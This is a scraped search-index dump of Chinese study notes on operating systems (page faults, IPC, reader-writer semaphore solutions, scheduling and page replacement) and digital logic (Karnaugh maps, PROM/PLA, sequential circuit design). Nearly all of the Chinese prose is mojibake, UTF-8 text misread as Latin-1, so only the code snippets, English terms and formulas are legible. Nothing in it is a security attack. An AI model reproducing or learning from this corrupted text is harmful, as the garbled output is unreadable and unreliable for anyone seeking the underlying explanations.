ç¼ºé¡µä¸­æ–­çš„å¤„ç†æµç¨‹ï¼š\n åœ¨å†…å­˜ä¸­æœ‰ç©ºé—²ç‰©ç†é¡µé¢æ—¶ï¼Œåˆ†é…ä¸€ç‰©ç†é¡µå¸§ fï¼Œè½¬ç¬¬ 5 æ­¥ï¼› ä¾æ® é¡µé¢ç½®æ¢ç®—æ³• é€‰æ‹©å°†è¢«æ›¿æ¢çš„ç‰©ç†é¡µå¸§ fï¼Œå¯¹åº”é€»è¾‘é¡µ qï¼› å¦‚æœ q è¢«ä¿®æ”¹è¿‡ï¼Œåˆ™æŠŠå®ƒå†™å›å¤–å­˜ï¼› ä¿®æ”¹ q çš„é¡µè¡¨é¡¹ä¸­é©»ç•™ä½ç½®ä¸º 0ï¼› å°†éœ€è¦è®¿é—®çš„é¡µ p è£…å…¥åˆ°ç‰©ç†é¡µé¢ fï¼› ä¿®æ”¹ p çš„é¡µè¡¨é¡¹é©»ç•™ä½ä¸º 1ï¼Œç‰©ç†é¡µå¸§å·ä¸º fï¼› é‡æ–°æ‰§è¡Œäº§ç”Ÿç¼ºé¡µçš„æŒ‡ä»¤ï¼›  è¿›ç¨‹é—´é€šä¿¡ #  è¿›ç¨‹é—´é€šä¿¡ï¼ˆInterProcess Communicationï¼‰æœ‰å“ªäº›æ–¹å¼ï¼Ÿ\nä¿¡å·ï¼šä¿¡å·æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºè¿›ç¨‹ä¹‹é—´é€šä¿¡æˆ–æ“ä½œçš„ä¸€ç§æœºåˆ¶\n  ä¿¡å·å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å‘é€ç»™æŸä¸€è¿›ç¨‹ï¼Œè€Œæ— é¡»çŸ¥é“è¯¥è¿›ç¨‹çš„çŠ¶æ€ã€‚\n  å¦‚æœè¯¥è¿›ç¨‹å¹¶æœªå¤„äºæ‰§è¡ŒçŠ¶æ€ï¼Œåˆ™è¯¥ä¿¡å·å°±ç”±å†…æ ¸ä¿å­˜èµ·æ¥ï¼ŒçŸ¥é“è¯¥è¿›ç¨‹æ¢å¤æ‰§è¡Œå¹¶ä¼ é€’ç»™ä»–ä¸ºæ­¢ã€‚\n  å¦‚æœä¸€ä¸ªä¿¡å·è¢«è¿›ç¨‹è®¾ç½®ä¸ºé˜»å¡ï¼Œåˆ™è¯¥ä¿¡å·çš„ä¼ é€’è¢«å»¶è¿Ÿï¼Œç›´åˆ°å…¶é˜»å¡è¢«å–æ¶ˆæ—¶æ‰è¢«ä¼ é€’ç»™è¿›ç¨‹ã€‚\n  ç®¡é“ï¼šç®¡é“æ˜¯ Linux æ”¯æŒçš„æœ€åˆ Unix IPC å½¢å¼ä¹‹ä¸€\n  ç®¡é“æ˜¯åŠåŒå·¥çš„ï¼Œæ•°æ®åªèƒ½å‘ä¸€ä¸ªæ–¹å‘æµåŠ¨ï¼›éœ€è¦åŒæ–¹é€šä¿¡æ—¶ï¼Œéœ€è¦å»ºç«‹èµ·ä¸¤ä¸ªç®¡é“ï¼›\n  åŒ¿åç®¡é“åªèƒ½ç”¨äºçˆ¶å­è¿›ç¨‹æˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´ï¼ˆå…·æœ‰äº²ç¼˜å…³ç³»çš„è¿›ç¨‹ï¼‰ï¼›\nåœ¨ C è¯­è¨€ä»£ç ä¸­ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ pipe å‡½æ•°ï¼š\nint pipe_fd[2]; assert(pipe(pipe_fd) \u0026gt;= 0);   å‘½åç®¡é“æœ‰ä¸€ä¸ªåå­—ï¼Œå‘½åç®¡é“çš„åå­—å¯¹åº”äºä¸€ä¸ªç£ç›˜ç´¢å¼•èŠ‚ç‚¹ï¼Œæœ‰äº†è¿™ä¸ªæ–‡ä»¶åï¼Œä»»ä½•è¿›ç¨‹æœ‰ç›¸åº”çš„æƒé™éƒ½å¯ä»¥å¯¹å®ƒè¿›è¡Œè®¿é—®ã€‚\nåœ¨ shell ä¸­ï¼Œä½¿ç”¨å¦‚ä¸‹ä¸¤æ¡å‘½ä»¤åˆ›å»ºæ˜¯ç­‰ä»·çš„ï¼š\n$ mkfifo myfifo  $ mknod myfifo p   å•ç‹¬æ„æˆä¸€ç§ç‹¬ç«‹çš„æ–‡ä»¶ç³»ç»Ÿï¼šç®¡é“å¯¹äºç®¡é“ä¸¤ç«¯çš„è¿›ç¨‹è€Œè¨€ï¼Œå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†å®ƒä¸æ˜¯æ™®é€šçš„æ–‡ä»¶ï¼Œå®ƒä¸å±äºæŸç§æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯è‡ªç«‹é—¨æˆ·ï¼Œå•ç‹¬æ„æˆä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”åªå­˜åœ¨ä¸å†…å­˜ä¸­ã€‚\n  æ¶ˆæ¯é˜Ÿåˆ—ï¼šä¸€ç³»åˆ—ä¿å­˜åœ¨å†…æ ¸ä¸­æ¶ˆæ¯çš„åˆ—è¡¨ã€‚ç”¨æˆ·è¿›ç¨‹å¯ä»¥å‘æ¶ˆæ¯é˜Ÿåˆ—æ·»åŠ æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥å‘æ¶ˆæ¯é˜Ÿåˆ—è¯»å–æ¶ˆæ¯ã€‚\n  æ¶ˆæ¯é˜Ÿåˆ—ä¸ç®¡é“é€šä¿¡ç›¸æ¯”ï¼Œå…¶ä¼˜åŠ¿æ˜¯å¯¹æ¯ä¸ªæ¶ˆæ¯æŒ‡å®šç‰¹å®šçš„æ¶ˆæ¯ç±»å‹ï¼Œæ¥æ”¶çš„æ—¶å€™ä¸éœ€è¦æŒ‰ç…§é˜Ÿåˆ—æ¬¡åºï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®è‡ªå®šä¹‰æ¡ä»¶æ¥æ”¶ç‰¹å®šç±»å‹çš„æ¶ˆæ¯ã€‚\n  å¯ä»¥æŠŠæ¶ˆæ¯çœ‹åšä¸€ä¸ªè®°å½•ï¼Œå…·æœ‰ç‰¹å®šçš„æ ¼å¼ä»¥åŠç‰¹å®šçš„ä¼˜å…ˆçº§ã€‚å¯¹æ¶ˆæ¯é˜Ÿåˆ—æœ‰å†™æƒé™çš„è¿›ç¨‹å¯ä»¥å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æŒ‰ç…§ä¸€å®šçš„è§„åˆ™æ·»åŠ æ–°æ¶ˆæ¯ï¼Œå¯¹æ¶ˆæ¯é˜Ÿåˆ—æœ‰è¯»æƒé™çš„è¿›ç¨‹å¯ä»¥ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯ã€‚\n  å…±äº«å†…å­˜ï¼šå…±äº«å†…å­˜å…è®¸ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªç»™å®šçš„å­˜å‚¨åŒº\n  è¿™ä¸€æ®µå­˜å‚¨åŒºå¯ä»¥è¢«ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹æ˜ å°„è‡³è‡ªèº«çš„åœ°å€ç©ºé—´ä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹å†™å…¥å…±äº«å†…å­˜çš„ä¿¡æ¯ï¼Œå¯ä»¥è¢«å…¶ä»–ä½¿ç”¨è¿™ä¸ªå…±äº«å†…å­˜çš„è¿›ç¨‹ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„å†…å­˜è¯»å–é”™åšè¯»å‡ºï¼Œä»è€Œå®ç°äº†è¿›ç¨‹é—´çš„é€šä¿¡ã€‚\n  é‡‡ç”¨å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡çš„ä¸€ä¸ªä¸»è¦å¥½å¤„æ˜¯æ•ˆç‡é«˜ï¼Œå› ä¸ºè¿›ç¨‹å¯ä»¥ç›´æ¥è¯»å†™å†…å­˜ï¼Œè€Œä¸éœ€è¦ä»»ä½•æ•°æ®çš„æ‹·è´ï¼Œå¯¹äºåƒç®¡é“å’Œæ¶ˆæ¯é˜Ÿé‡Œç­‰é€šä¿¡æ–¹å¼ï¼Œåˆ™éœ€è¦å†å†…æ ¸å’Œç”¨æˆ·ç©ºé—´è¿›è¡Œå››æ¬¡çš„æ•°æ®æ‹·è´ï¼Œè€Œå…±äº«å†…å­˜åˆ™åªæ‹·è´ä¸¤æ¬¡ï¼šä¸€æ¬¡ä»è¾“å…¥æ–‡ä»¶åˆ°å…±äº«å†…å­˜åŒºï¼Œå¦ä¸€æ¬¡ä»å…±äº«å†…å­˜åˆ°è¾“å‡ºæ–‡ä»¶ã€‚\n  IPC é—®é¢˜ #  æœ‰å“ªäº› IPC é—®é¢˜ï¼Ÿ\n  ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼›\n  è¯»è€…å†™è€…é—®é¢˜ï¼šè¯»è¯»ä¸äº’æ–¥ã€è¯»å†™äº’æ–¥ã€å†™å†™äº’æ–¥ï¼›\n  è¯»è€…ä¼˜å…ˆè§£å†³æ–¹æ¡ˆã€‚ä¸€äº›å˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef int mutex; int reader_amount = 0; mutex writer_exclusive = 1, amount_exclusive = 1;  extern void P(mutex \u0026amp;); extern void V(mutex \u0026amp;); è¯»è€…å’Œå†™è€…çš„ä»£ç å¦‚ä¸‹ï¼š\nvoid read () {  P(amount_exclusive);  if (reader_amount++ == 0) P(writer_exclusive);  V(amount_exclusive);   do_read();   P(amount_exclusive);  if (--reader_amount == 0) V(writer_exclusive);  V(amount_exclusive); }  void write () {  P(writer_exclusive);  do_write();  V(writer_exclusive); }   å…¬å¹³è§£å†³æ–¹æ¡ˆï¼ˆæ²¡æœ‰ä»»ä½•ä¸€ä¸ªåœ¨å†™è€…ä¹‹ååˆ°æ¥çš„è¯»è€…ï¼Œä¼šå…ˆäºå®ƒæ‰§è¡Œï¼‰ã€‚ä¸€äº›å˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef int mutex; int reader_amount = 0, writer_amount = 0; mutex ramount_exclusive = 1, wamount_exclusive = 1; mutex fairness = 1, writer_exclusive = 1;  extern void P(mutex \u0026amp;); extern void V(mutex \u0026amp;); è¯»è€…å’Œå†™è€…çš„ä»£ç å¦‚ä¸‹ï¼š\nvoid read () {  P(fairness);  P(ramount_exclusive);  if (reader_amount++ == 0) P(writer_exclusive);  V(ramount_exclusive);  V(fairness);   do_read();   P(ramount_exclusive);  if (--reader_amount == 0) V(writer_exclusive);  V(ramount_exclusive); }  void write () {  P(wamount_exclusive);  if (writer_amount++ == 0) P(fairness);  V(wamount_exclusive);   P(writer_exclusive);  do_write();  V(writer_exclusive);   P(wamount_exclusive);  if (--writer_amount == 0) V(fairness);  V(wamount_exclusive); }      æ²‰ç¡çš„ç†å‘å¸ˆé—®é¢˜ï¼›\n  å“²å­¦å®¶å°±é¤é—®é¢˜ï¼›\n  IPC é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Ÿ\n ä¿¡å·é‡ï¼šä¸€ç§æŠ½è±¡çš„æ•°æ®ç»“æ„ï¼Œç”±ä¸€ä¸ªæ•´å½¢å˜é‡å’Œä¸¤ä¸ªåŸå­æ“ä½œï¼ˆP å‡å°‘ã€V å¢åŠ ï¼‰æ„æˆï¼› ç®¡ç¨‹ï¼šä¸€ä¸ªé”ï¼ˆæ§åˆ¶ç®¡ç¨‹ä»£ç äº’æ–¥è®¿é—®ï¼‰å’Œå¤šä¸ªæ¡ä»¶å˜é‡ï¼ˆç®¡ç†å…±äº«æ•°æ®çš„å¹¶å‘è®¿é—®ï¼‰æ„æˆï¼›  æ¡ä»¶å˜é‡æ˜¯ç®¡ç¨‹å†…çš„ç­‰å¾…æœºåˆ¶ï¼Œæ¯ä¸ªæ¡ä»¶æ¡ä»¶å˜é‡è¡¨ç¤ºä¸€ä¸ªç­‰å¾…åŸå› ï¼Œå¯¹åº”ä¸€ä¸ªç­‰å¾…é˜Ÿåˆ—ï¼› å†…éƒ¨ä¸»è¦æœ‰ä¸¤ç§å‡½æ•°æ“ä½œ Wait() ä¸ Signal()ï¼›    è¿›ç¨‹è°ƒåº¦ç®—æ³• #  å¦‚ä½•è¯„ä»·ä¸€ä¸ªè°ƒåº¦ç®—æ³•çš„ä¼˜åŠ£ï¼Ÿ\n CPU ä½¿ç”¨ç‡ï¼šCPU å¤„äºå¿™çŠ¶æ€çš„æ—¶é—´ç™¾åˆ†æ¯”ï¼› ååé‡ï¼šå•ä½æ—¶é—´å†…å®Œæˆçš„è¿›ç¨‹æ•°é‡ï¼› ç­‰å¾…æ—¶é—´ï¼šè¿›ç¨‹åœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ï¼Œæ²¡æœ‰æ‰§è¡Œä»»åŠ¡çš„æ€»æ—¶é—´ï¼› å“åº”æ—¶é—´ï¼šä»æäº¤è¯·æ±‚åˆ°äº§ç”Ÿå“åº”æ‰€èŠ±è´¹çš„æ€»æ—¶é—´ï¼› å‘¨è½¬æ—¶é—´ï¼šè¿›ç¨‹ä»å¼€å§‹åˆ°ç»“æŸï¼ˆåŒ…æ‹¬ç­‰å¾…æ—¶é—´ï¼‰çš„æ€»æ—¶é—´ï¼›  è¿›ç¨‹è°ƒåº¦æœ‰å“ªäº›ç®—æ³•ï¼Ÿ\n å…ˆæ¥å…ˆæœåŠ¡ç®—æ³•ï¼ˆFirst Come First Served, FCFSï¼‰ï¼› çŸ­è¿›ç¨‹ä¼˜å…ˆç®—æ³•ï¼ˆSPNï¼‰ã€çŸ­å‰©ä½™æ—¶é—´ä¼˜å…ˆç®—æ³•ï¼ˆSRTï¼‰ï¼› é«˜å“åº”æ¯”ä¼˜å…ˆç®—æ³•ï¼ˆHRRNï¼‰ï¼› æ—¶é—´ç‰‡è½®è½¬ç®—æ³•ï¼ˆRound-Robin, RRï¼‰ï¼› å¤šçº§é˜Ÿåˆ—è°ƒåº¦ç®—æ³•ï¼ˆMQï¼‰ï¼› å¤šçº§åé¦ˆé˜Ÿåˆ—ç®—æ³•ï¼ˆMLFQï¼‰ï¼› ä¼˜å…ˆçº§ç®—æ³•ï¼šé™æ€ä¼˜å…ˆçº§ã€åŠ¨æ€ä¼˜å…ˆçº§ã€çº¿æ€§ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•ï¼ˆSSR, Selfish Round Robinï¼‰  é¡µé¢ç½®æ¢ç®—æ³• #  ä»€ä¹ˆæ˜¯é¡µé¢ç½®æ¢ç®—æ³•ï¼Ÿ\n ä½œç”¨ï¼šå½“å‡ºç°ç¼ºé¡µå¼‚å¸¸ï¼Œéœ€è°ƒå…¥æ–°é¡µé¢è€Œå†…å­˜å·²æ»¡æ—¶ï¼Œç½®æ¢ç®—æ³•é€‰æ‹©è¢«ç½®æ¢çš„ç‰©ç†é¡µé¢ï¼› ç›®æ ‡ï¼šå°½å¯èƒ½å‡å°‘é¡µé¢çš„è°ƒå…¥è°ƒå‡ºæ¬¡æ•°ï¼›  é¡µé¢ç½®æ¢ç®—æ³•æœ‰å“ªäº›ï¼Ÿ\n  æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆOPTï¼‰ï¼šä¸€ç§æƒ³è±¡å‡ºæ¥çš„ç†æƒ³ç®—æ³•ï¼›\n  å…ˆè¿›å…ˆå‡ºç®—æ³•ï¼ˆFirst-In First-Out, FIFOï¼‰ï¼›\n  æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç®—æ³•ï¼ˆLeast Rencently Used, LRUï¼‰ï¼›\n  æœ€ä¸å¸¸ç”¨ç®—æ³•ï¼ˆLeast Frequently Used, LFU, NRUï¼‰ï¼›\n  æ—¶é’Ÿç½®æ¢ç®—æ³•ï¼ˆClockï¼‰ï¼›\n  "},{"id":306,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8D%A1%E8%AF%BA%E5%9B%BE/","title":"å¡è¯ºå›¾","section":"æ•°å­—é€»è¾‘","content":"å¡è¯ºå›¾ #  n ä¸ªå˜é‡çš„å¡è¯ºå›¾ä¸­æœ€å°é¡¹çš„åˆå¹¶è§„å¾‹å¦‚ä¸‹ï¼š\n å¡è¯ºå›¾ä¸­å°æ–¹æ ¼çš„ä¸ªæ•°å¿…é¡»ä¸º $$2^m$$ ä¸ªï¼ˆ$$m \\in \\mathbb{Z}, m \\le n$$ï¼‰ å¡è¯ºåœˆä¸­çš„ $$2^m$$ ä¸ªå°æ–¹æ ¼æœ‰ä¸€å®šçš„æ’åˆ—è§„å¾‹ï¼Œä»–ä»¬å«æœ‰ m ä¸ªä¸åŒå˜é‡ï¼Œï¼ˆn-mï¼‰ä¸ªç›¸åŒå˜é‡ã€‚ å¡è¯ºåœˆä¸­çš„ $$2^m$$ ä¸ªå°æ–¹æ ¼å¯¹åº”çš„æœ€å°é¡¹å¯ä»¥ç”¨ ï¼ˆn-mï¼‰ä¸ªå˜é‡çš„ä¸é¡¹è¡¨ç¤ºï¼Œè¯¥ä¸é¡¹ç”±è¿™äº›æœ€å°é¡¹ä¸­çš„ç›¸åŒéƒ¨åˆ†ç»„æˆã€‚ å½“ m = 0 æ—¶ï¼Œå¡è¯ºåœˆåŒ…å«ä¸€ä¸ªæœ€å°é¡¹ï¼›å½“ m = n æ—¶ï¼Œå¡è¯ºåœˆåŒ…å›´äº†æ•´ä¸ªå¡è¯ºå›¾ï¼Œå¯ç”¨ 1 è¡¨ç¤º.  "},{"id":307,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/","title":"å¯ç¼–ç¨‹é€»è¾‘å™¨ä»¶","section":"æ•°å­—é€»è¾‘","content":" å­¦ä¹ é€”å¾„ï¼š\n æ¬§é˜³æ˜Ÿæ˜ã€åä¸­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾ ã€Šæ•°å­—é€»è¾‘ã€‹   ä½å¯†åº¦å¯ç¼–ç¨‹é€»è¾‘å™¨ä»¶ #  å¯ç¼–ç¨‹åªè¯»å­˜å‚¨å™¨ #  1. åŠå¯¼ä½“å­˜å‚¨å™¨åˆ†ç±» #  æŒ‰åŠŸèƒ½åˆ†ç±»å¯ä»¥åˆ†ä¸ºéšæœºå­˜å–å­˜å‚¨å™¨ RAMï¼ˆRandom Access Memory, RAMï¼‰å’Œåªè¯»å­˜å‚¨å™¨ ROMï¼ˆRead Only Memoryï¼‰ä¸¤å¤§ç±»ã€‚\n  RAM æ˜¯ä¸€ç§æ—¢å¯è¯»åˆå¯å†™çš„å­˜å‚¨å™¨ï¼Œæ•…ç§°ä¸ºè¯»å†™å­˜å‚¨å™¨ã€‚\n ä¼˜ç‚¹æ˜¯è¯»å†™æ–¹ä¾¿ï¼Œä½¿ç”¨çµæ´» ç¼ºç‚¹æ˜¯ä¸€æ—¦æ–­ç‚¹ï¼Œæ‰€å­˜å‚¨çš„ä¿¡æ¯ä¾¿ä¼šä¸¢å¤±ï¼Œå®ƒå±äºæ˜“å¤±æ€§å­˜å‚¨å™¨ã€‚    ROM æ˜¯ä¸€ç§åœ¨æ­£å¸¸å·¥ä½œæ—¶åªèƒ½è¯»å‡ºã€ä¸èƒ½å†™å…¥çš„å­˜å‚¨å™¨ã€‚\n  åªè¯»å­˜å‚¨å™¨å­˜å‚¨å±äºçš„è¿‡ç¨‹é€šå¸¸ç§°ä¸ºç¼–ç¨‹ï¼Œæ ¹æ®ç¼–ç¨‹æ–¹æ³•çš„ä¸åŒå¯ä»¥åˆ†ä¸ºï¼šæ©è†œç¼–ç¨‹ ROMï¼ˆMROMï¼‰å’Œç”¨æˆ·å¯ç¼–ç¨‹ ROM ä¸¤ç±»ã€‚\n  åªè¯»å­˜å‚¨å™¨ ROM å±äºéæ˜“å¤±æ€§å­˜å‚¨å™¨ï¼Œå³ä½¿åˆ‡æ–­ç”µæºï¼ŒROM å†…çš„ä¿¡æ¯ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚\n    2. å¯ç¼–ç¨‹ ROM çš„ç»“æ„ #  å¯ç¼–ç¨‹ ROM ä¸»è¦ç”±åœ°å€è¯‘ç å™¨å’Œå­˜å‚¨ä½“ä¸¤å¤§éƒ¨åˆ†ç»„æˆï¼š\nå…¶ä¸­ï¼š\n $$A_0, A_1, \u0026hellip;, A_{n-1}$$ ç§°ä¸ºåœ°å€è¾“å…¥çº¿ï¼› $$W_0, W_1, \u0026hellip;, W_{2^n-1}$$ ç§°ä¸ºåœ°å€è¯‘ç è¾“å‡ºçº¿ï¼Œä¸€èˆ¬ç§°ä¸ºå­—çº¿ï¼› $$D_0, D_1, \u0026hellip;, D_{m-1}$$ ç§°ä¸ºæ•°æ®è¾“å‡ºçº¿ï¼Œä¸€èˆ¬ç§°ä¸ºä½çº¿ã€‚  å…¶å®ç°æ–¹å¼ï¼Œä¸ŠåŠéƒ¨åˆ†æ˜¯ä¸€ä¸ªä¸é˜µåˆ—æ„æˆçš„å…¨åœ°å€è¯‘ç å™¨ï¼Œä¸‹åŠéƒ¨åˆ†æ˜¯ä¸€ä¸ªæˆ–é˜µåˆ—æ„æˆçš„ç½‘ç»œï¼š\n3. å¯ç¼–ç¨‹ ROM çš„ç±»å‹ #   ä¸€æ¬¡ç¼–ç¨‹çš„ ROMï¼šPROMã€‚äº§å“å‡ºå‚æ—¶ï¼Œæ‰€æœ‰å­˜å‚¨å…ƒå‡è¢«åŠ å·¥ä¸ºä¸€ä¸ªçŠ¶æ€ â€0â€œï¼ˆæˆ– â€1â€œï¼‰ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦å°†æŸäº›å­˜å‚¨å…ƒçš„çŠ¶æ€æ”¹å˜æˆå¦ä¸€çŠ¶æ€ï¼Œä½†è¿™ç§ç¼–ç¨‹åªèƒ½è¿›è¡Œä¸€æ¬¡ã€‚ å¯æŠ¹å¯ç¼–ç¨‹ ROMï¼šEPROMã€‚å¯åå¤ç¼–ç¨‹ï¼Œä½†åªèƒ½æ•´ä½“æ“¦é™¤ï¼Œä¸èƒ½ç‹¬ç«‹æ“¦é™¤ã€‚ ç”µå¯æŠ¹å¯ç¼–ç¨‹ ROMï¼šEEPROMã€‚ä½¿ç”¨çµæ´»æ–¹ä¾¿ã€‚ å¿«é—ªå­˜å‚¨å™¨ï¼šFlash Memoryã€‚  å¯ç¼–ç¨‹é€»è¾‘é˜µåˆ— #  åœ¨ PROM ä¸­ï¼Œå³ä½¿æœ‰å¤šä¸ªå­˜å‚¨å•å…ƒæ‰€å­˜æ”¾çš„å†…å®¹å®Œå…¨ç›¸åŒä¹Ÿå¿…é¡»é‡å¤å­˜æ”¾ï¼Œæ— æ³•èŠ‚çœè¿™äº›å•å…ƒï¼›å¹¶ä¸”ï¼ŒPROM çš„ä¸é˜µåˆ—å›ºå®šåœ°äº§ç”Ÿ n ä¸ªè¾“å…¥å˜é‡çš„å…¨éƒ¨æœ€å°é¡¹ã€‚å¯¼è‡´äº†èŠ¯ç‰‡é¢ç§¯çš„åˆ©ç”¨ç‡ä¸é«˜ã€‚\nä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå‡ºç°äº†ä¸€ç§ä¸é˜µåˆ—å’Œæˆ–é˜µåˆ—å‡å¯ç¼–ç¨‹çš„é€»è¾‘å™¨ä»¶ï¼Œå³ PLA (Programmable Logic Array)ã€‚å…¶é€»è¾‘ç»“æ„å¦‚ä¸‹ï¼š\n"},{"id":308,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/","title":"åŒæ­¥æ—¶åºé€»è¾‘ç”µè·¯","section":"æ•°å­—é€»è¾‘","content":" å­¦ä¹ é€”å¾„ï¼š\n æ¬§é˜³æ˜Ÿæ˜ã€åä¸­ç§‘æŠ€å¤§å­¦å‡ºç‰ˆç¤¾ ã€Šæ•°å­—é€»è¾‘ã€‹   åŒæ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡ #  è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤ï¼š\nå®Œå…¨ç¡®å®šåŒæ­¥æ—¶åºé€»è¾‘ç”µè·¯è®¾è®¡ #  1. å½¢æˆåŸå§‹çŠ¶æ€å›¾å’ŒåŸå§‹çŠ¶æ€è¡¨ #  ä¸€èˆ¬æ­¥éª¤ï¼š\n ç¡®å®šç”µè·¯æ¨¡å‹ï¼šMealy æ¨¡å‹ã€Moore æ¨¡å‹ã€‚ è®¾ç«‹åˆå§‹çŠ¶æ€ æ ¹æ®éœ€è¦è®°å¿†çš„ä¿¡æ¯å¢åŠ æ–°çš„çŠ¶æ€ ç¡®å®šå„æ—¶åˆ»ç”µè·¯çš„è¾“å‡º  ä¾‹å­ï¼š\n è®¾è®¡ä¸€ä¸ªæ¨¡ 5 å¯é€†è®¡æ•°å™¨ï¼Œè¯¥ç”µè·¯æœ‰ä¸€ä¸ªè¾“å…¥ x å’Œä¸€ä¸ªè¾“å‡º Zã€‚x=0 è¡¨ç¤ºåŠ æ§åˆ¶ä¿¡å·ï¼Œx=1 è¡¨ç¤ºå‡æ§åˆ¶ä¿¡å·ã€‚è¾“å‡º Z è¡¨ç¤ºå€Ÿä½æˆ–è¿›ä½ä¿¡å·ã€‚å°è¯•å»ºç«‹è¯¥è®¡æ•°å™¨çš„ Mealy å‹åŸå§‹çŠ¶æ€å›¾å’ŒçŠ¶æ€è¡¨ã€‚\n å‡è®¾è®¡æ•°å™¨çš„ 5 ä¸ªçŠ¶æ€åˆ†åˆ«ä¸º 0ã€1ã€2ã€3ã€4ï¼Œå…¶ä¸­ 0 è¡¨ç¤ºåˆå§‹çŠ¶æ€ã€‚åŸå§‹çŠ¶æ€è¡¨å¦‚ä¸‹æ‰€ç¤ºï¼š\n   å½“å‰çŠ¶æ€ æ¬¡æ€/è¾“å‡º Z æ¬¡æ€/è¾“å‡º Z      x=0 x=1   0 1/0 4/1   1 2/0 0/0   2 3/0 1/0   3 4/0 2/0   4 0/1 3/0    2. çŠ¶æ€åŒ–ç®€ #  ç­‰æ•ˆçŠ¶æ€ï¼š\n  å®šä¹‰ï¼šå‡è®¾çŠ¶æ€ $$S_i$$ å’Œ $$S_j$$ æ˜¯å®Œå…¨ç¡®å®šçŠ¶æ€è¡¨ä¸­çš„ä¸¤ä¸ªçŠ¶æ€ï¼Œå¦‚æœå¯¹æ‰€æœ‰å¯èƒ½çš„è¾“å…¥åºåˆ—ï¼Œåˆ†åˆ«ä» $$S_i$$ å’Œ $$S_j$$ å‡ºå‘ï¼Œæ‰€å¾—åˆ°çš„è¾“å‡ºå“åº”åºåˆ—å®Œå…¨ç›¸åŒï¼Œåˆ™çŠ¶æ€ $$S_i$$ å’ŒçŠ¶æ€ $$S_j$$ æ˜¯ç­‰æ•ˆçš„ï¼Œè®°ä½œ $$(S_i, S_j)$$ã€‚\n  åˆ¤æ–­æ–¹æ³•ï¼šè¾“å…¥ç›¸åŒï¼›æ¬¡æ€ç›¸åŒã€æ¬¡æ€äº¤é”™æˆ–ä¸ºå„è‡ªçš„ç°æ€ã€æ¬¡æ€å¾ªç¯æˆ–ä¸ºç­‰æ•ˆå¯¹ã€‚\n  ç­‰æ•ˆç±»ï¼šè‹¥å¹²ä¸ªå½¼æ­¤ç­‰æ•ˆçš„çŠ¶æ€æ„æˆçš„é›†åˆã€‚\næœ€å¤§ç­‰æ•ˆç±»ï¼šä¸è¢«ä»»ä½•åˆ«çš„ç­‰æ•ˆç±»åŒ…å«çš„ç­‰æ•ˆç±»ã€‚\nåˆ©ç”¨éšå«è¡¨è¿›è¡ŒçŠ¶æ€åŒ–ç®€ï¼š\n ä½œéšå«è¡¨ï¼šä¸€ä¸ªè¾¹é•¿ä¸º n-1 çš„ç­‰è…°ç›´è§’ä¸‰è§’å½¢ç½‘æ ¼ï¼Œçºµå‘ç¼ºå°‘ç¬¬ä¸€ä¸ªçŠ¶æ€ã€æ¨ªå‘ç¼ºå°‘æœ€åä¸€ä¸ªçŠ¶æ€ï¼› å¯»æ‰¾ç­‰æ•ˆå¯¹ï¼šæŒ‰ç…§éšå«è¡¨ä»ä¸Šè‡³ä¸‹ã€ä»å·¦è‡³å³çš„é¡ºåºé€ä¸€æ£€æŸ¥ã€‚æ£€æŸ¥ç»“æœåˆ†ä¸‰ç§æƒ…å†µï¼šæ˜ç¡®ç­‰æ•ˆçš„ã€æ˜ç¡®ä¸ç­‰æ•ˆçš„ã€ä¸å…¶ä»–çŠ¶æ€æœ‰å…³ï¼› æ±‚å‡ºæœ€å¤§ç­‰æ•ˆç±»ï¼šåˆ©ç”¨ç­‰æ•ˆçŠ¶æ€çš„ä¼ é€’æ€§ï¼Œæ±‚å‡ºå„æœ€å¤§ç­‰æ•ˆç±»ï¼› 